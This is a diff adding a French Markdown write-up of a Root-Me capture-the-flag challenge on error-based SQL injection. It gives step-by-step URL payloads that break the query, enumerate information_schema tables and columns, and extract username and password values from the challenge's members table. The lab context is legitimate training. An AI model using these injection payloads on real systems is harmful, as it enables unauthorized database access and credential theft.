@@ -383,7 +383,75 @@ Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser u
 
 [Source](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3)
 
-### 7 |
+### 7 | SQL INJECTION
+
+[Lien](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error?lang=fr)
+
+Dans cet exercice Root-Me, le but est de comprendre comment exploiter une faille SQL Injection – Error Based.
+Provoquer volontairement des erreurs SQL pour récupérer des informations sur la base de données.
+
+On arrive sur une page d'authenfication avec 2 champs , mais on peut rien en tiré ni sur les champs ni depuis l'URL. Si on regard bien sur le 2ème onglet qui permet d'afficher le contenu 
+on vois des paramètre sur l'URL exploitable.
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC
+```
+
+Ensuite on casse la requête pour récupérer les informations a l'aide des erreurs.
+
+```
+?action=contents&order='
+```
+[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/1.png)
+
+Après j'ai fais la requête pour trouver la table et les colonnes.
+
+table :
+
+```
+?action=contents&order=1,(SELECT table_name FROM information_schema.tables LIMIT 1)::int
+```
+
+les colonnes :
+
+```
+?action=contents&order=1,(SELECT column_name
+FROM information_schema.columns
+WHERE table_name='m3mbr35t4bl3'
+LIMIT 1 OFFSET 1)--
+```
+
+```
+?action=contents&order=1,(SELECT column_name
+FROM information_schema.columns
+WHERE table_name='m3mbr35t4bl3'
+LIMIT 1 OFFSET 2)--
+```
+
+Jusqu’à découvrir :
+
+id
+
+us3rn4m3_c0l
+
+p455w0rd_c0l
+
+
+On fais pareil pour les utilisateurs et le mot de passe :
+
+```
+?action=contents&order=1,(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1)--
+```
+
+et le mot de passe: 
+
+```
+?action=contents&order=1,(SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1)--
+```
+
+[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/2.png)
+
+[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/3.png)
 
 ### 8 | Injection de commande - Contournement de filtre
 
